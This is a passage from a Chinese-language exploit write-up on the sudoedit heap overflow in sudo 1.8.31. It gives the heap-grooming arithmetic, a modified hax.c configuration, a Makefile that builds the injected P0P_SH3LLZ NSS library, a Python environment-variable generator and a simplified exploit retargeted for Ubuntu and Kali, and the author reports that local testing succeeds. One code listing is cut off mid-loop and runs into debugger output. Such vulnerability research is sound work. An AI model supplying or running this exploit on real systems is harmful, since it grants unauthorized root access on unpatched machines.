service_user对应chunk首地址是：0x55dab3d19380
###  5.3 漏洞利用
设置断点：加载sudoers.so
查看line以及service_user结构体的内容：
执行断点处函数调用，查看sudoers.so的基址，再在malloc出设置断点。
执行到malloc处，申请data大小为0x74，对应chunk为0x80
分配前的bins布局，可以看到之前为line申请的chunk在tcachebin的0x80列表处，也就是user_args申请会获得这块chunk。
分配之后进行堆溢出，覆盖service_user结构体即可。  
在nss_load_library处设置断点。
继续运行，查看nss_load_library函数中的ni参数，地址是group行的第一个service_user结构体地址。
查看现在结构体的值，已经被覆盖为我们要的结果，但是发现多了一个空格。
查看覆盖的name之后的值，发现了54个B
下面来做一下计算题。  
首先for循环将NewArgv字符串数组中的数据复制到userargs中，通过空格分隔。  
NewArgv[1] = 56‘A’+’\’，总长度为58。  
NewArgv[2] = ‘\’，总长度为2。  
NewArgv[3] = 54‘B’+’\’，总长度为56。  
user_args需要的长度就是58+2+56=0x74（与调试情况一致）。  
当从NewArgv[1]的数据拷贝至user_args时，由于每个参数最后都是\，因此已经完成了name的覆盖，此时*to指向的是`X/POP_SH3LLZ`后面一个字节。之后for循环去拷贝NewArgv[2]，但是会先往*to的地方写入一个空格，这就是空格的由来，而NewArgv[2]是”\“，所以写入NULL作为结束字符，之后又去拷贝NewArgv[3]，也就是name属性之后出现的54个B。
###  5.4总结
LC_ALL=C.UTF-8@+212*’c’，长度为221，十六进制是0xdd，再加上chunk头0x10，申请的chunk大小为0xf0。  
通过  
1.申请13个0xf0大小的chunk  
2.释放该13个chunk  
3.穿插申请0x20大小的chunk，从而使得分割一个0xd0大小的chunk进入smallbin。
在为line申请一个0x80大小的chunk时，有一个较大chunk在unsortedbin，切割一部分出来后进入largebin中。之后申请了两个name_database_entry（大小分别是0x20,0x30）以及两个service_user（大小均是0x40），合并起来大小为0xd0，正好消耗掉smallbin中的0xd0大小的chunk，从而使得我们要覆盖的service_user结构体所使用的chunk是继续从largebin中的chunk分割而来。而前一部分0x80大小的chunk会被释放进入tcachebin。  
user_args的大小根据sudoedit参数配置，正好申请的是0x80大小的chunk，因此只要保证user_args的大小是0x80，且最后一个符号是`\`即可。  
最后要覆盖的长度是user_args的数据部分0x70  
service_user的name属性前的大小是0x30+chunk的头部0x10，所以最终是0xb0=176字节。  
覆盖的数据是  
56个A加一个`\`=57个字节  
一个`\`=1个字节  
54个’B’加一个`\` = 55个字节  
63个`\` = 63个字节  
相加等于176字节，最后覆盖name属性。  
因此我们知道sudoedit -s 后面的参数没有必要分多个，只需要一个且最后符号是\即可。  
尝试一下修改hax.c
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = SUDOEDIT_PATH,
            .smash_len_a    = 0,
            .smash_len_b    = 112,//只使用B，并且要保证len_b+2能申请到0x80的chunk，且len_b+1+null_stomp_len=176即可
            .null_stomp_len = 63, 
            .lc_all_len     = 212
        },
    char *s_argv[]={
            "sudoedit", "-s", smash_b, NULL
        };
再修改Makefile，去除.so前的空格
    //Makefile
    all:
            rm -rf libnss_X
            mkdir libnss_X
            gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
            gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_.so.2' lib.c
    brute: all
            gcc -DBRUTE -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_.so.2' lib.c
    clean:
            rm -rf libnss_X sudo-hax-me-a-sandwich
本地测试通过。
## 6 另一个堆布局思路
利用在环境变量中加入`;x=x`，使得释放后的chunk不会再被申请，因为LC
_ALL的值之后都是”C”了，通过之前的调试知道需要覆盖的service_user结构体使用的chunk大小为0x40，那么先将除了LC_ALL的其他LC_
环境变量都设置为需要0x40大小的chunk的值。  
一个py脚本方便生成环境变量：
    #encoding:utf-8
    LC_LEN = {
    "LC_CTYPE":0x40,
    "LC_NUMERIC":0x40,
    "LC_TIME":0x40,
    "LC_COLLATE":0x40,
    "LC_MONETARY":0x40,
    "LC_MESSAGES":0x40,
    "LC_PAPER":0x40,
    "LC_NAME":0x40,
    "LC_ADDRESS":0x40,
    "LC_TELEPHONE":0x40,
    "LC_MEASUREMENT":0x40,
    "LC_IDENTIFICATION":0x40
    }
    def getdata(key,length):
        default_data = "C.UTF-8@;x=x"
        data_len = length-0x10
        data = default_data+"A"*(data_len-len(default_data)-len(key)-1)+key
        return data
    def main():
        LEN_DATA = {}
        for key in LC_LEN:
            data = getdata(key,LC_LEN[key])
            print("\"%s=%s\"," % (key,data))
    if __name__=="__main__":
        main()
另外将参考exp中的hax.c进行了简化，仅针对当前系统
    //hax.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MAX_ENVP 2000
    #define SUDOEDIT_PATH "/usr/bin/sudoedit"
    int main(int argc, char *argv[]) {
        int len_s,len_null;
        len_s = 0xe0;
        len_null = 10;
        char *lc_env[] = {
    "LC_CTYPE=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAAAAALC_CTYPE",
    "LC_NUMERIC=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAAALC_NUMERIC",
    "LC_TIME=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAAAAAALC_TIME",
    "LC_COLLATE=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAAALC_COLLATE",
    "LC_MONETARY=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAALC_MONETARY",
    "LC_MESSAGES=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAALC_MESSAGES",
    "LC_PAPER=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAAAAALC_PAPER",
    "LC_NAME=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAAAAAALC_NAME",
    "LC_ADDRESS=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAAAALC_ADDRESS",
    "LC_TELEPHONE=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAAAALC_TELEPHONE",
    "LC_MEASUREMENT=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAAAAALC_MEASUREMENT",
    "LC_IDENTIFICATION=C.UTF-8@;x=xAAAAAAAAAAAAAAAAAALC_IDENTIFICATION",
        };
        char *data_s = malloc(len_s);
        memset(data_s, 'A', len_s-2);
       // data_s[len_s-2] = '\\';确认偏移时先不设置。
        data_s[len_s-1] = '\x00';
        char *s_argv[]={
            "sudoedit", "-s", data_s, NULL
        };
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
        for(int i = 0; i , "LC_CTYPE",
    0x564eef15b880 "C.UTF-8@;x=x", 'A' , "LC_NUMERIC",
    0x564eef15b240 "C.UTF-8@;x=x", 'A' , "LC_TIME",
    0x564eef15a760 "C.UTF-8@;x=x", 'A' , "LC_COLLATE",
    0x564eef15a0c0 "C.UTF-8@;x=x", 'A' , "LC_MONETARY",
    0x564eef159800 "C.UTF-8@;x=x", 'A' , "LC_MESSAGES",
    0x564eef15c180 "LC_CTYPE=C.UTF-8@;x=x", 'A' , "LC_CTYPE;LC_NUMERIC=C.UTF-8@;x=x", 'A' , "LC_NUMERIC;LC_TIME=C.UTF-8@;x=x", 'A' , "LC_TIME;LC_COLLATE=C.UTF-8@;x=xAAAAA"...,
    0x564eef158d30 "C.UTF-8@;x=x", 'A' , "LC_PAPER",
    0x564eef158720 "C.UTF-8@;x=x", 'A' , "LC_NAME",
    0x564eef158180 "C.UTF-8@;x=x", 'A' , "LC_ADDRESS",
    0x564eef157b10 "C.UTF-8@;x=x", 'A' , "LC_TELEPHONE",
    0x564eef156610 "C.UTF-8@;x=x", 'A' , "LC_MEASUREMENT",
    0x564eef155f60 "C.UTF-8@;x=x", 'A' , "LC_IDENTIFICATION"
2.在set_cmnd执行过后，查看nss_load_library的参数地址是：0x564eef15a0c0
service_user使用的是LC_MONETARY的chunk，离的最近的chunk就是LC_MESSAGES，因此将LC_MESSAGES分配的chunk大小修改为0xf0(根据参考文档得知0xf0大小的chunk未被申请过)，之后只要使得的user_args申请的大小为0xf0即可。  
修改后的环境变量，确认LC_MONETARY(0x55fcde73ea20)和LC_MESSAGES(0x55fcde73e1d0)的地址。
后续跟一下，确认user_args使用的地址是0x55fcde73e1d0，service_user使用的地址是0x55fcde73ea20。  
现在计算偏移长度  
0x55fcde73ea20-0x55fcde73e1d0+0x30=0x880=2176（PS:0x30是service_user的name属性的偏移量）  
len_s-1+len_null = 2176  
因此len_null = 1953
###  6.2 kali
换了另外一台kali系统，使用参考exp是无法成功的，按照上述思路构造一下。  
 **系统环境**
**配置文件**
相比于ubuntu的，passwd行会少分配一个service_user，所以环境变量设置，偏移肯定都需要重新计算，另外测试发现kali中会多申请一个0xf0的chunk，所以环境变量中需要设置两个0xf0。  
python脚本中环境变量长度配置
    LC_LEN = {
    "LC_CTYPE":0x40,
    "LC_NUMERIC":0x40,
    "LC_TIME":0x40,
    "LC_COLLATE":0x40,
    "LC_MONETARY":0x40,
    "LC_MESSAGES":0x40,
    "LC_PAPER":0xf0,
    "LC_NAME":0xf0,
    "LC_ADDRESS":0x40,
    "LC_TELEPHONE":0x40,
    "LC_MEASUREMENT":0x40,
    "LC_IDENTIFICATION":0x40
    }
user_args使用的chunk是LC_PAPER，user_args使用的是LC_MESSAGES  
调试确认两个chunk的地址，LC_PAPER:0x561c9d500530、LC_MESSAGES:0x561c9d4fff10  
最后计算偏移  
0x561c9d500530-0x561c9d4fff10+0x30 = 0x650 = 1616  
len_null = 1616+1-len_s = 1393